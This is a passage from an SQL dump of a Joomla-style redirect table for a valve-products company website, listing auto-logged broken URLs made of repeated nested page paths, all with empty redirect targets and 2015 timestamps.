(987, 'http://flotechcontrols.com//products/wey/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:32:58', '0000-00-00 00:00:00'),
(988, 'http://flotechcontrols.com//products/wey/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:33:00', '0000-00-00 00:00:00'),
(989, 'http://flotechcontrols.com//products/wey/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:33:02', '0000-00-00 00:00:00'),
(990, 'http://flotechcontrols.com//products/wey/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:33:03', '0000-00-00 00:00:00'),
(991, 'http://flotechcontrols.com//products/wey/contact-us', '', '', '', 1, 0, '2015-01-14 02:33:05', '0000-00-00 00:00:00'),
(992, 'http://flotechcontrols.com//products/noreva/about-us', '', '', '', 1, 0, '2015-01-14 02:33:08', '0000-00-00 00:00:00'),
(993, 'http://flotechcontrols.com//products/noreva/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:33:10', '0000-00-00 00:00:00'),
(994, 'http://flotechcontrols.com//products/noreva/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:33:12', '0000-00-00 00:00:00'),
(995, 'http://flotechcontrols.com//products/noreva/products/wey', '', '', '', 1, 0, '2015-01-14 02:33:13', '0000-00-00 00:00:00'),
(996, 'http://flotechcontrols.com//products/noreva/products/noreva', '', '', '', 1, 0, '2015-01-14 02:33:15', '0000-00-00 00:00:00'),
(997, 'http://flotechcontrols.com//products/noreva/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:33:17', '0000-00-00 00:00:00'),
(998, 'http://flotechcontrols.com//products/noreva/products/birkett', '', '', '', 1, 0, '2015-01-14 02:33:18', '0000-00-00 00:00:00'),
(999, 'http://flotechcontrols.com//products/noreva/products/sor', '', '', '', 1, 0, '2015-01-14 02:33:20', '0000-00-00 00:00:00'),
(1000, 'http://flotechcontrols.com//products/noreva/products/mts', '', '', '', 1, 0, '2015-01-14 02:33:21', '0000-00-00 00:00:00'),
(1001, 'http://flotechcontrols.com//products/noreva/products/copes', '', '', '', 1, 0, '2015-01-14 02:33:23', '0000-00-00 00:00:00'),
(1002, 'http://flotechcontrols.com//products/noreva/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:33:25', '0000-00-00 00:00:00'),
(1003, 'http://flotechcontrols.com//products/noreva/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:33:26', '0000-00-00 00:00:00'),
(1004, 'http://flotechcontrols.com//products/noreva/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:33:28', '0000-00-00 00:00:00'),
(1005, 'http://flotechcontrols.com//products/noreva/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:33:30', '0000-00-00 00:00:00'),
(1006, 'http://flotechcontrols.com//products/noreva/contact-us', '', '', '', 1, 0, '2015-01-14 02:33:31', '0000-00-00 00:00:00'),
(1007, 'http://flotechcontrols.com//products/valvtechnologies/about-us', '', '', '', 1, 0, '2015-01-14 02:33:35', '0000-00-00 00:00:00'),
(1008, 'http://flotechcontrols.com//products/valvtechnologies/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:33:36', '0000-00-00 00:00:00'),
(1009, 'http://flotechcontrols.com//products/valvtechnologies/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:33:38', '0000-00-00 00:00:00'),
(1010, 'http://flotechcontrols.com//products/valvtechnologies/products/wey', '', '', '', 1, 0, '2015-01-14 02:33:40', '0000-00-00 00:00:00'),
(1011, 'http://flotechcontrols.com//products/valvtechnologies/products/noreva', '', '', '', 1, 0, '2015-01-14 02:33:41', '0000-00-00 00:00:00'),
(1012, 'http://flotechcontrols.com//products/valvtechnologies/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:33:43', '0000-00-00 00:00:00'),
(1013, 'http://flotechcontrols.com//products/valvtechnologies/products/birkett', '', '', '', 1, 0, '2015-01-14 02:33:44', '0000-00-00 00:00:00'),
(1014, 'http://flotechcontrols.com//products/valvtechnologies/products/sor', '', '', '', 1, 0, '2015-01-14 02:33:46', '0000-00-00 00:00:00'),
(1015, 'http://flotechcontrols.com//products/valvtechnologies/products/mts', '', '', '', 1, 0, '2015-01-14 02:33:48', '0000-00-00 00:00:00'),
(1016, 'http://flotechcontrols.com//products/valvtechnologies/products/copes', '', '', '', 1, 0, '2015-01-14 02:33:49', '0000-00-00 00:00:00'),
(1017, 'http://flotechcontrols.com//products/valvtechnologies/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:33:51', '0000-00-00 00:00:00'),
(1018, 'http://flotechcontrols.com//products/valvtechnologies/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:33:52', '0000-00-00 00:00:00'),
(1019, 'http://flotechcontrols.com//products/valvtechnologies/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:33:54', '0000-00-00 00:00:00'),
(1020, 'http://flotechcontrols.com//products/valvtechnologies/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:33:55', '0000-00-00 00:00:00'),
(1021, 'http://flotechcontrols.com//products/valvtechnologies/contact-us', '', '', '', 1, 0, '2015-01-14 02:33:57', '0000-00-00 00:00:00'),
(1022, 'http://flotechcontrols.com//products/birkett/about-us', '', '', '', 1, 0, '2015-01-14 02:34:00', '0000-00-00 00:00:00'),
(1023, 'http://flotechcontrols.com//products/birkett/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:34:02', '0000-00-00 00:00:00'),
(1024, 'http://flotechcontrols.com//products/birkett/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:34:04', '0000-00-00 00:00:00'),
(1025, 'http://flotechcontrols.com//products/birkett/products/wey', '', '', '', 1, 0, '2015-01-14 02:34:05', '0000-00-00 00:00:00'),
(1026, 'http://flotechcontrols.com//products/birkett/products/noreva', '', '', '', 1, 0, '2015-01-14 02:34:07', '0000-00-00 00:00:00');
INSERT INTO `j6kpf_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(1027, 'http://flotechcontrols.com//products/birkett/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:34:08', '0000-00-00 00:00:00'),
(1028, 'http://flotechcontrols.com//products/birkett/products/birkett', '', '', '', 1, 0, '2015-01-14 02:34:10', '0000-00-00 00:00:00'),
(1029, 'http://flotechcontrols.com//products/birkett/products/sor', '', '', '', 1, 0, '2015-01-14 02:34:12', '0000-00-00 00:00:00'),
(1030, 'http://flotechcontrols.com//products/birkett/products/mts', '', '', '', 1, 0, '2015-01-14 02:34:13', '0000-00-00 00:00:00'),
(1031, 'http://flotechcontrols.com//products/birkett/products/copes', '', '', '', 1, 0, '2015-01-14 02:34:15', '0000-00-00 00:00:00'),
(1032, 'http://flotechcontrols.com//products/birkett/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:34:16', '0000-00-00 00:00:00'),
(1033, 'http://flotechcontrols.com//products/birkett/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:34:18', '0000-00-00 00:00:00'),
(1034, 'http://flotechcontrols.com//products/birkett/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:34:19', '0000-00-00 00:00:00'),
(1035, 'http://flotechcontrols.com//products/birkett/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:34:21', '0000-00-00 00:00:00'),
(1036, 'http://flotechcontrols.com//products/birkett/contact-us', '', '', '', 1, 0, '2015-01-14 02:34:23', '0000-00-00 00:00:00'),
(1037, 'http://flotechcontrols.com//products/sor/about-us', '', '', '', 1, 0, '2015-01-14 02:34:26', '0000-00-00 00:00:00'),
(1038, 'http://flotechcontrols.com//products/sor/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:34:28', '0000-00-00 00:00:00'),
(1039, 'http://flotechcontrols.com//products/sor/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:34:29', '0000-00-00 00:00:00'),
(1040, 'http://flotechcontrols.com//products/sor/products/wey', '', '', '', 1, 0, '2015-01-14 02:34:31', '0000-00-00 00:00:00'),
(1041, 'http://flotechcontrols.com//products/sor/products/noreva', '', '', '', 1, 0, '2015-01-14 02:34:32', '0000-00-00 00:00:00'),
(1042, 'http://flotechcontrols.com//products/sor/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:34:34', '0000-00-00 00:00:00'),
(1043, 'http://flotechcontrols.com//products/sor/products/birkett', '', '', '', 1, 0, '2015-01-14 02:34:36', '0000-00-00 00:00:00'),
(1044, 'http://flotechcontrols.com//products/sor/products/sor', '', '', '', 1, 0, '2015-01-14 02:34:37', '0000-00-00 00:00:00'),
(1045, 'http://flotechcontrols.com//products/sor/products/mts', '', '', '', 1, 0, '2015-01-14 02:34:39', '0000-00-00 00:00:00'),
(1046, 'http://flotechcontrols.com//products/sor/products/copes', '', '', '', 1, 0, '2015-01-14 02:34:40', '0000-00-00 00:00:00'),
(1047, 'http://flotechcontrols.com//products/sor/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:34:42', '0000-00-00 00:00:00'),
(1048, 'http://flotechcontrols.com//products/sor/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:34:43', '0000-00-00 00:00:00'),
(1049, 'http://flotechcontrols.com//products/sor/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:34:45', '0000-00-00 00:00:00'),
(1050, 'http://flotechcontrols.com//products/sor/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:34:46', '0000-00-00 00:00:00'),
(1051, 'http://flotechcontrols.com//products/sor/contact-us', '', '', '', 1, 0, '2015-01-14 02:34:48', '0000-00-00 00:00:00'),
(1052, 'http://flotechcontrols.com//products/mts/about-us', '', '', '', 1, 0, '2015-01-14 02:34:52', '0000-00-00 00:00:00'),
(1053, 'http://flotechcontrols.com//products/mts/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:34:53', '0000-00-00 00:00:00'),
(1054, 'http://flotechcontrols.com//products/mts/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:34:55', '0000-00-00 00:00:00'),
(1055, 'http://flotechcontrols.com//products/mts/products/wey', '', '', '', 1, 0, '2015-01-14 02:34:56', '0000-00-00 00:00:00'),
(1056, 'http://flotechcontrols.com//products/mts/products/noreva', '', '', '', 1, 0, '2015-01-14 02:34:58', '0000-00-00 00:00:00'),
(1057, 'http://flotechcontrols.com//products/mts/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:35:00', '0000-00-00 00:00:00'),
(1058, 'http://flotechcontrols.com//products/mts/products/birkett', '', '', '', 1, 0, '2015-01-14 02:35:01', '0000-00-00 00:00:00'),
(1059, 'http://flotechcontrols.com//products/mts/products/sor', '', '', '', 1, 0, '2015-01-14 02:35:03', '0000-00-00 00:00:00'),
(1060, 'http://flotechcontrols.com//products/mts/products/mts', '', '', '', 1, 0, '2015-01-14 02:35:04', '0000-00-00 00:00:00'),
(1061, 'http://flotechcontrols.com//products/mts/products/copes', '', '', '', 1, 0, '2015-01-14 02:35:06', '0000-00-00 00:00:00'),
(1062, 'http://flotechcontrols.com//products/mts/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:35:07', '0000-00-00 00:00:00'),
(1063, 'http://flotechcontrols.com//products/mts/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:35:09', '0000-00-00 00:00:00'),
(1064, 'http://flotechcontrols.com//products/mts/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:35:11', '0000-00-00 00:00:00'),
(1065, 'http://flotechcontrols.com//products/mts/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:35:12', '0000-00-00 00:00:00'),
(1066, 'http://flotechcontrols.com//products/mts/contact-us', '', '', '', 1, 0, '2015-01-14 02:35:14', '0000-00-00 00:00:00'),
(1067, 'http://flotechcontrols.com//products/copes/about-us', '', '', '', 1, 0, '2015-01-14 02:35:17', '0000-00-00 00:00:00'),
(1068, 'http://flotechcontrols.com//products/copes/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:35:19', '0000-00-00 00:00:00'),
(1069, 'http://flotechcontrols.com//products/copes/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:35:21', '0000-00-00 00:00:00'),
(1070, 'http://flotechcontrols.com//products/copes/products/wey', '', '', '', 1, 0, '2015-01-14 02:35:22', '0000-00-00 00:00:00'),
(1071, 'http://flotechcontrols.com//products/copes/products/noreva', '', '', '', 1, 0, '2015-01-14 02:35:24', '0000-00-00 00:00:00'),
(1072, 'http://flotechcontrols.com//products/copes/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:35:25', '0000-00-00 00:00:00'),
(1073, 'http://flotechcontrols.com//products/copes/products/birkett', '', '', '', 1, 0, '2015-01-14 02:35:27', '0000-00-00 00:00:00'),
(1074, 'http://flotechcontrols.com//products/copes/products/sor', '', '', '', 1, 0, '2015-01-14 02:35:28', '0000-00-00 00:00:00'),
(1075, 'http://flotechcontrols.com//products/copes/products/mts', '', '', '', 1, 0, '2015-01-14 02:35:30', '0000-00-00 00:00:00'),
(1076, 'http://flotechcontrols.com//products/copes/products/copes', '', '', '', 1, 0, '2015-01-14 02:35:32', '0000-00-00 00:00:00'),
(1077, 'http://flotechcontrols.com//products/copes/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:35:33', '0000-00-00 00:00:00'),
(1078, 'http://flotechcontrols.com//products/copes/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:35:35', '0000-00-00 00:00:00'),
(1079, 'http://flotechcontrols.com//products/copes/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:35:36', '0000-00-00 00:00:00'),
(1080, 'http://flotechcontrols.com//products/copes/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:35:38', '0000-00-00 00:00:00'),
(1081, 'http://flotechcontrols.com//products/copes/contact-us', '', '', '', 1, 0, '2015-01-14 02:35:40', '0000-00-00 00:00:00'),
(1082, 'http://flotechcontrols.com//application-sectors/power/about-us', '', '', '', 1, 0, '2015-01-14 02:35:43', '0000-00-00 00:00:00'),
(1083, 'http://flotechcontrols.com//application-sectors/power/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:35:45', '0000-00-00 00:00:00'),
(1084, 'http://flotechcontrols.com//application-sectors/power/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:35:46', '0000-00-00 00:00:00'),
(1085, 'http://flotechcontrols.com//application-sectors/power/products/wey', '', '', '', 1, 0, '2015-01-14 02:35:48', '0000-00-00 00:00:00'),
(1086, 'http://flotechcontrols.com//application-sectors/power/products/noreva', '', '', '', 1, 0, '2015-01-14 02:35:49', '0000-00-00 00:00:00'),
(1087, 'http://flotechcontrols.com//application-sectors/power/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:35:51', '0000-00-00 00:00:00'),
(1088, 'http://flotechcontrols.com//application-sectors/power/products/birkett', '', '', '', 1, 0, '2015-01-14 02:35:52', '0000-00-00 00:00:00'),
(1089, 'http://flotechcontrols.com//application-sectors/power/products/sor', '', '', '', 1, 0, '2015-01-14 02:35:54', '0000-00-00 00:00:00'),
(1090, 'http://flotechcontrols.com//application-sectors/power/products/mts', '', '', '', 1, 0, '2015-01-14 02:35:56', '0000-00-00 00:00:00'),
(1091, 'http://flotechcontrols.com//application-sectors/power/products/copes', '', '', '', 1, 0, '2015-01-14 02:35:57', '0000-00-00 00:00:00'),
(1092, 'http://flotechcontrols.com//application-sectors/power/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:35:59', '0000-00-00 00:00:00'),
(1093, 'http://flotechcontrols.com//application-sectors/power/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:36:01', '0000-00-00 00:00:00'),
(1094, 'http://flotechcontrols.com//application-sectors/power/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:36:02', '0000-00-00 00:00:00'),
(1095, 'http://flotechcontrols.com//application-sectors/power/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:36:04', '0000-00-00 00:00:00'),
(1096, 'http://flotechcontrols.com//application-sectors/power/contact-us', '', '', '', 1, 0, '2015-01-14 02:36:05', '0000-00-00 00:00:00'),
(1097, 'http://flotechcontrols.com//application-sectors/water/about-us', '', '', '', 1, 0, '2015-01-14 02:36:09', '0000-00-00 00:00:00'),
(1098, 'http://flotechcontrols.com//application-sectors/water/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:36:11', '0000-00-00 00:00:00'),
(1099, 'http://flotechcontrols.com//application-sectors/water/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:36:12', '0000-00-00 00:00:00'),
(1100, 'http://flotechcontrols.com//application-sectors/water/products/wey', '', '', '', 1, 0, '2015-01-14 02:36:14', '0000-00-00 00:00:00'),
(1101, 'http://flotechcontrols.com//application-sectors/water/products/noreva', '', '', '', 1, 0, '2015-01-14 02:36:15', '0000-00-00 00:00:00'),
(1102, 'http://flotechcontrols.com//application-sectors/water/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:36:17', '0000-00-00 00:00:00'),
(1103, 'http://flotechcontrols.com//application-sectors/water/products/birkett', '', '', '', 1, 0, '2015-01-14 02:36:18', '0000-00-00 00:00:00'),
(1104, 'http://flotechcontrols.com//application-sectors/water/products/sor', '', '', '', 1, 0, '2015-01-14 02:36:20', '0000-00-00 00:00:00'),
(1105, 'http://flotechcontrols.com//application-sectors/water/products/mts', '', '', '', 1, 0, '2015-01-14 02:36:22', '0000-00-00 00:00:00'),
(1106, 'http://flotechcontrols.com//application-sectors/water/products/copes', '', '', '', 1, 0, '2015-01-14 02:36:23', '0000-00-00 00:00:00'),
(1107, 'http://flotechcontrols.com//application-sectors/water/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:36:25', '0000-00-00 00:00:00'),
(1108, 'http://flotechcontrols.com//application-sectors/water/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:36:26', '0000-00-00 00:00:00'),
(1109, 'http://flotechcontrols.com//application-sectors/water/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:36:28', '0000-00-00 00:00:00'),
(1110, 'http://flotechcontrols.com//application-sectors/water/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:36:29', '0000-00-00 00:00:00'),
(1111, 'http://flotechcontrols.com//application-sectors/water/contact-us', '', '', '', 1, 0, '2015-01-14 02:36:31', '0000-00-00 00:00:00'),
(1112, 'http://flotechcontrols.com//application-sectors/mining/about-us', '', '', '', 1, 0, '2015-01-14 02:36:35', '0000-00-00 00:00:00'),
(1113, 'http://flotechcontrols.com//application-sectors/mining/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:36:36', '0000-00-00 00:00:00'),
(1114, 'http://flotechcontrols.com//application-sectors/mining/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:36:38', '0000-00-00 00:00:00'),
(1115, 'http://flotechcontrols.com//application-sectors/mining/products/wey', '', '', '', 1, 0, '2015-01-14 02:36:39', '0000-00-00 00:00:00'),
(1116, 'http://flotechcontrols.com//application-sectors/mining/products/noreva', '', '', '', 1, 0, '2015-01-14 02:36:41', '0000-00-00 00:00:00'),
(1117, 'http://flotechcontrols.com//application-sectors/mining/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:36:42', '0000-00-00 00:00:00'),
(1118, 'http://flotechcontrols.com//application-sectors/mining/products/birkett', '', '', '', 1, 0, '2015-01-14 02:36:44', '0000-00-00 00:00:00'),
(1119, 'http://flotechcontrols.com//application-sectors/mining/products/sor', '', '', '', 1, 0, '2015-01-14 02:36:45', '0000-00-00 00:00:00'),
(1120, 'http://flotechcontrols.com//application-sectors/mining/products/mts', '', '', '', 1, 0, '2015-01-14 02:36:47', '0000-00-00 00:00:00'),
(1121, 'http://flotechcontrols.com//application-sectors/mining/products/copes', '', '', '', 1, 0, '2015-01-14 02:36:49', '0000-00-00 00:00:00'),
(1122, 'http://flotechcontrols.com//application-sectors/mining/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:36:50', '0000-00-00 00:00:00'),
(1123, 'http://flotechcontrols.com//application-sectors/mining/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:36:52', '0000-00-00 00:00:00'),
(1124, 'http://flotechcontrols.com//application-sectors/mining/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:36:53', '0000-00-00 00:00:00'),
(1125, 'http://flotechcontrols.com//application-sectors/mining/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:36:55', '0000-00-00 00:00:00'),
(1126, 'http://flotechcontrols.com//application-sectors/mining/contact-us', '', '', '', 1, 0, '2015-01-14 02:36:57', '0000-00-00 00:00:00'),
(1127, 'http://flotechcontrols.com//application-sectors/oil-and-gas/about-us', '', '', '', 1, 0, '2015-01-14 02:37:00', '0000-00-00 00:00:00'),
(1128, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:37:02', '0000-00-00 00:00:00'),
(1129, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:37:03', '0000-00-00 00:00:00'),
(1130, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/wey', '', '', '', 1, 0, '2015-01-14 02:37:05', '0000-00-00 00:00:00'),
(1131, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/noreva', '', '', '', 1, 0, '2015-01-14 02:37:06', '0000-00-00 00:00:00'),
(1132, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:37:08', '0000-00-00 00:00:00'),
(1133, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/birkett', '', '', '', 1, 0, '2015-01-14 02:37:10', '0000-00-00 00:00:00'),
(1134, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/sor', '', '', '', 1, 0, '2015-01-14 02:37:11', '0000-00-00 00:00:00'),
(1135, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/mts', '', '', '', 1, 0, '2015-01-14 02:37:13', '0000-00-00 00:00:00'),
(1136, 'http://flotechcontrols.com//application-sectors/oil-and-gas/products/copes', '', '', '', 1, 0, '2015-01-14 02:37:14', '0000-00-00 00:00:00'),
(1137, 'http://flotechcontrols.com//application-sectors/oil-and-gas/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:37:16', '0000-00-00 00:00:00'),
(1138, 'http://flotechcontrols.com//application-sectors/oil-and-gas/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:37:18', '0000-00-00 00:00:00'),
(1139, 'http://flotechcontrols.com//application-sectors/oil-and-gas/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:37:19', '0000-00-00 00:00:00'),
(1140, 'http://flotechcontrols.com//application-sectors/oil-and-gas/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:37:21', '0000-00-00 00:00:00'),
(1141, 'http://flotechcontrols.com//application-sectors/oil-and-gas/contact-us', '', '', '', 1, 0, '2015-01-14 02:37:22', '0000-00-00 00:00:00'),
(1142, 'http://flotechcontrols.com//contact-us/about-us', '', '', '', 1, 0, '2015-01-14 02:37:26', '0000-00-00 00:00:00'),
(1143, 'http://flotechcontrols.com//contact-us/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:37:27', '0000-00-00 00:00:00'),
(1144, 'http://flotechcontrols.com//contact-us/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:37:29', '0000-00-00 00:00:00'),
(1145, 'http://flotechcontrols.com//contact-us/products/wey', '', '', '', 1, 0, '2015-01-14 02:37:31', '0000-00-00 00:00:00'),
(1146, 'http://flotechcontrols.com//contact-us/products/noreva', '', '', '', 1, 0, '2015-01-14 02:37:32', '0000-00-00 00:00:00'),
(1147, 'http://flotechcontrols.com//contact-us/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:37:34', '0000-00-00 00:00:00'),
(1148, 'http://flotechcontrols.com//contact-us/products/birkett', '', '', '', 1, 0, '2015-01-14 02:37:35', '0000-00-00 00:00:00'),
(1149, 'http://flotechcontrols.com//contact-us/products/sor', '', '', '', 1, 0, '2015-01-14 02:37:37', '0000-00-00 00:00:00'),
(1150, 'http://flotechcontrols.com//contact-us/products/mts', '', '', '', 1, 0, '2015-01-14 02:37:38', '0000-00-00 00:00:00'),
(1151, 'http://flotechcontrols.com//contact-us/products/copes', '', '', '', 1, 0, '2015-01-14 02:37:40', '0000-00-00 00:00:00'),
(1152, 'http://flotechcontrols.com//contact-us/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:37:42', '0000-00-00 00:00:00'),
(1153, 'http://flotechcontrols.com//contact-us/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:37:43', '0000-00-00 00:00:00'),
(1154, 'http://flotechcontrols.com//contact-us/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:37:45', '0000-00-00 00:00:00'),
(1155, 'http://flotechcontrols.com//contact-us/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:37:46', '0000-00-00 00:00:00'),
(1156, 'http://flotechcontrols.com//contact-us/contact-us', '', '', '', 1, 0, '2015-01-14 02:37:48', '0000-00-00 00:00:00'),
(1157, 'http://flotechcontrols.com///about-us/about-us', '', '', '', 1, 0, '2015-01-14 02:38:22', '0000-00-00 00:00:00'),
(1158, 'http://flotechcontrols.com///about-us/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:38:23', '0000-00-00 00:00:00'),
(1159, 'http://flotechcontrols.com///about-us/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:38:25', '0000-00-00 00:00:00'),
(1160, 'http://flotechcontrols.com///about-us/products/wey', '', '', '', 1, 0, '2015-01-14 02:38:27', '0000-00-00 00:00:00'),
(1161, 'http://flotechcontrols.com///about-us/products/noreva', '', '', '', 1, 0, '2015-01-14 02:38:28', '0000-00-00 00:00:00'),
(1162, 'http://flotechcontrols.com///about-us/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:38:30', '0000-00-00 00:00:00'),
(1163, 'http://flotechcontrols.com///about-us/products/birkett', '', '', '', 1, 0, '2015-01-14 02:38:31', '0000-00-00 00:00:00'),
(1164, 'http://flotechcontrols.com///about-us/products/sor', '', '', '', 1, 0, '2015-01-14 02:38:33', '0000-00-00 00:00:00'),
(1165, 'http://flotechcontrols.com///about-us/products/mts', '', '', '', 1, 0, '2015-01-14 02:38:35', '0000-00-00 00:00:00'),
(1166, 'http://flotechcontrols.com///about-us/products/copes', '', '', '', 1, 0, '2015-01-14 02:38:36', '0000-00-00 00:00:00'),
(1167, 'http://flotechcontrols.com///about-us/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:38:38', '0000-00-00 00:00:00'),
(1168, 'http://flotechcontrols.com///about-us/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:38:39', '0000-00-00 00:00:00'),
(1169, 'http://flotechcontrols.com///about-us/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:38:41', '0000-00-00 00:00:00'),
(1170, 'http://flotechcontrols.com///about-us/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:38:43', '0000-00-00 00:00:00'),
(1171, 'http://flotechcontrols.com///about-us/contact-us', '', '', '', 1, 0, '2015-01-14 02:38:45', '0000-00-00 00:00:00'),
(1172, 'http://flotechcontrols.com///products/red-valve/about-us', '', '', '', 1, 0, '2015-01-14 02:38:48', '0000-00-00 00:00:00'),
(1173, 'http://flotechcontrols.com///products/red-valve/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:38:50', '0000-00-00 00:00:00'),
(1174, 'http://flotechcontrols.com///products/red-valve/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:38:51', '0000-00-00 00:00:00'),
(1175, 'http://flotechcontrols.com///products/red-valve/products/wey', '', '', '', 1, 0, '2015-01-14 02:38:53', '0000-00-00 00:00:00'),
(1176, 'http://flotechcontrols.com///products/red-valve/products/noreva', '', '', '', 1, 0, '2015-01-14 02:38:55', '0000-00-00 00:00:00'),
(1177, 'http://flotechcontrols.com///products/red-valve/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:38:56', '0000-00-00 00:00:00'),
(1178, 'http://flotechcontrols.com///products/red-valve/products/birkett', '', '', '', 1, 0, '2015-01-14 02:38:58', '0000-00-00 00:00:00'),
(1179, 'http://flotechcontrols.com///products/red-valve/products/sor', '', '', '', 1, 0, '2015-01-14 02:38:59', '0000-00-00 00:00:00'),
(1180, 'http://flotechcontrols.com///products/red-valve/products/mts', '', '', '', 1, 0, '2015-01-14 02:39:01', '0000-00-00 00:00:00'),
(1181, 'http://flotechcontrols.com///products/red-valve/products/copes', '', '', '', 1, 0, '2015-01-14 02:39:02', '0000-00-00 00:00:00'),
(1182, 'http://flotechcontrols.com///products/red-valve/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:39:04', '0000-00-00 00:00:00'),
(1183, 'http://flotechcontrols.com///products/red-valve/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:39:06', '0000-00-00 00:00:00'),
(1184, 'http://flotechcontrols.com///products/red-valve/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:39:07', '0000-00-00 00:00:00'),
(1185, 'http://flotechcontrols.com///products/red-valve/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:39:09', '0000-00-00 00:00:00'),
(1186, 'http://flotechcontrols.com///products/red-valve/contact-us', '', '', '', 1, 0, '2015-01-14 02:39:10', '0000-00-00 00:00:00'),
(1187, 'http://flotechcontrols.com///products/tideflex/about-us', '', '', '', 1, 0, '2015-01-14 02:39:14', '0000-00-00 00:00:00'),
